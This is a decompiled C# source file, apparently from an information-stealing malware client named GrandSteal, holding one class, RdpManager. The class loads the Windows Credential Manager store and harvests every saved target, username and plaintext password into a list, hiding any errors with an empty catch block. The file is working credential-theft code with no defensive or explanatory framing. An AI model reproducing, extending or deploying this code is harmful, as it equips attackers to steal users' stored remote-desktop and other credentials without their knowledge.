using System;
using System.Collections.Generic;
using CredentialManagement;
using GrandSteal.Client.Models.Credentials;
using GrandSteal.SharedModels.Models;

namespace GrandSteal.Client.Data.Recovery
{
	// Token: 0x02000022 RID: 34
	public class RdpManager : ICredentialsManager<RdpCredential>
	{
		// Token: 0x060000F5 RID: 245 RVA: 0x00007A50 File Offset: 0x00005C50
		public IEnumerable<RdpCredential> GetAll()
		{
			List<RdpCredential> list = new List<RdpCredential>();
			try
			{
				CredentialSet credentialSet = new CredentialSet().Load();
				int num = 0;
				for (;;)
				{
					int num2 = num;
					int? num3 = (credentialSet != null) ? new int?(credentialSet.Count) : null;
					if (!(num2 < num3.GetValueOrDefault() & num3 != null))
					{
						break;
					}
					List<RdpCredential> list2 = list;
					RdpCredential rdpCredential = new RdpCredential();
					Credential credential = credentialSet[num];
					rdpCredential.Target = ((credential != null) ? credential.Target : null);
					Credential credential2 = credentialSet[num];
					rdpCredential.Password = (string.IsNullOrEmpty((credential2 != null) ? credential2.Password : null) ? "NOT SAVED" : credentialSet[num].Password);
					Credential credential3 = credentialSet[num];
					rdpCredential.Username = (string.IsNullOrEmpty((credential3 != null) ? credential3.Username : null) ? "NOT SAVED" : credentialSet[num].Username);
					list2.Add(rdpCredential);
					num++;
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
